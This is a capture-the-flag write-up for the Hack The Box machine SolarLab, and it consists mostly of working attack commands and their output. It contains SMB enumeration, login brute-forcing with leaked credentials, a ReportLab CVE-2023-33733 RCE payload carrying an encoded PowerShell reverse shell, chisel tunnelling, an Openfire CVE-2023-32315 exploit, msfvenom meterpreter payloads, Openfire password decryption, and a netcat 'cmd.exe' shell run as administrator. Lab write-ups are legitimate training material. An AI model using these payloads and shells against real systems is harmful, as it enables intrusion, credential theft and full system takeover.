HTB Solarlab Write Ups

sudo nmap -sS -sC -sV -vvv -p- 10.10.11.16 
80/tcp   open  http          syn-ack ttl 127 nginx 1.24.0
|_http-server-header: nginx/1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: SolarLab Instant Messenger
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
6791/tcp open  http          syn-ack ttl 127 nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0

crackmapexec smb 10.10.11.16 -u 'xmasc0der' -p '' --shares
SMB         10.10.11.16     445    SOLARLAB         Documents       READ    

# Check its attributes
smbmap -H 10.10.11.16 -u 'xmasc0der' -p ''
Documents                        READ ONLY
IPC$                             READ ONLY       Remote IPC

# Lets check the Document file
smbclient //10.10.11.16/Documents -U xmasc0der --password=''
smb: \> ls
  concepts                            D        0  Fri Apr 26 07:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 02:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 04:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 11:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 11:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 11:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 02:35:57 2023
smb: \concepts\> ls
  Training-Request-Form.docx          A   161337  Fri Nov 17 02:46:57 2023
  Travel-Request-Sample.docx          A    30953  Fri Nov 17 02:36:54 2023

# Download the excel file and docx file, from the details-file.xslx we found
Username	Password
Alexander.knight@gmail.com	al;ksdhfewoiuh
KAlexander	dkjafblkjadsfgl
Alexander.knight@gmail.com	d398sadsknr390
blake.byte	ThisCanB3typedeasily1@
AlexanderK	danenacia9234n
ClaudiaS	dadsfawe9dafkn

# Create a FUZZ username list
Alexander.knight
Alexander.k
KAlexander
AlexanderK
blake.byte
blake.b
bblake
blakeb
Claudia.springer
Claudia.s
SClaudia
ClaudiaS

# Create a FUZZ password list
al;ksdhfewoiuh
dkjafblkjadsfgl
d398sadsknr390
ThisCanB3typedeasily1@
danenacia9234n
dadsfawe9dafkn

# Lets try to FUZZ
wfuzz -c -z file,username -z file,password --hw 0 -d "username=FUZZ&password=FUZ2Z" -H "Content-Type: application/x-www-form-urlencoded" -u http://report.solarlab.htb:6791/login 
...
000000046:   302        5 L      22 W       207 Ch      "blakeb - ThisCanB3typedeasily1@"  
...

# One of the Response show 302 login with credential fuzzed
# From the report portal we can found most of the form are same. Therefore I choose Home Office Request form.. I found the vulnerability online that we can exploit the form.
https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897
https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0

# Use below powershell reverse shell and encode to base64
https://github.com/Javelinblog/PowerShell-Encoded-Commands-Tool/tree/main?tab=readme-ov-file

$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

<para>    
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">    
    exploit this address
    </font>
</para>

# Due to it had characters limit, we will use burpsuite to injet more code into Home Office address text box.

# Prepare listener before proceed
nc -lvnp 443

PS C:\Users\blake\Desktop> type user.txt
64423206a10065cf0caf3d3027581552

# Found a db file in below file path
PS C:\Users\blake\Documents\app\reports\instance> ls
-a----        11/17/2023  12:11 PM          12288 users.db  

# Download and check what is it
scp .\users.db kali@10.10.14.3:/home/kali/Desktop

Username    Password
BlakeB  BlakeB
ClaudiaS    ClaudiaS
AlexanderK  ClaudiaS
blakeb  ThisCanB3typedeasily1@
claudias    007poiuytrewq
alexanderk  HotP!fireguard

# Check the background running service
netstat -a
...
  TCP    127.0.0.1:9090         solarlab:0             LISTENING
  TCP    127.0.0.1:9091         solarlab:0             LISTENING
...

# Lets Chisel it
PS C:\tmp> iwr -uri http://10.10.14.3/Reverse-Shell/chisel-win64.exe -Outfile chisel.exe

kali> ./chisel-linux64 server --reverse --port 1188

PS C:\tmp> .\chisel.exe client 10.10.14.3:1188 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091

# Access to 9090 and 9091
# We found it is 4.7.4 Openfire is vulnerable
git clone https://github.com/miko550/CVE-2023-32315
cd CVE-2023-32315
pip3 install -r requirements.txt
python3 CVE-2023-32315.py -t http://127.0.0.1:9090
...
Successfully retrieved JSESSIONID: node0174zff5uurke21mllihh6gjdbs5.node0 + csrf: f9cmbflq3KyaKV4
User added successfully: url: http://127.0.0.1:9090 username: 6g3erd password: aqjr1z
...

# Acces with the user added and add goto tab plugin > upload plugin openfire-management-tool-plugin.jar

# goto tab server > server settings > Management tool
# Access websehll with password "123"
# Go to system command
# Create listen to new port, this time we will use metasploit
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=4455 -f exe -o cute.exe

msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST tun0
set LPORT 4455
run -j

# Upload the files again using above methods
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

nc -lvnp 6666

<para>    
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANgA2ADYANgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">    
    exploit this address
    </font>
</para>

PS C:\tmp> iwr -uri http://10.10.14.3/cute.exe -Outfile cute.exe

# Go back to openfire management tools
powershell -c Get-Acl -Path "C:\tmp\cute.exe" | fl
powershell -c Start-Process -FilePath "C:\tmp\cute.exe"

Listing: C:\Program Files\Openfire\embedded-db
meterpreter > download openfire.script /home/kali/Desktop

# From the script we found admin user
...
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
...

# We can try to decrypt openfire password
git clone https://github.com/c0rdis/openfire_decrypt

javac OpenFireDecryptPass.java 
java OpenFireDecryptPass.java becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
...
ThisPasswordShouldDo!@ 
...

# Now we can use Runas to privilege escalation
# Create a new payload and run as administrator
meterpreter > upload /home/kali/Desktop/RunasCs.exe .
meterpreter > upload /home/kali/Desktop/Windows/nc.exe .
nc -lvnp 8877
RunasCs.exe administrator ThisPasswordShouldDo!@ "C:\tmp\nc.exe 10.10.14.3 8877 -e cmd.exe" -t 0

C:\>whoami
solarlab\administrator
C:\Users\Administrator\Desktop>type root.txt
b207df05b4bdaa4a9363f88f9dd4318e


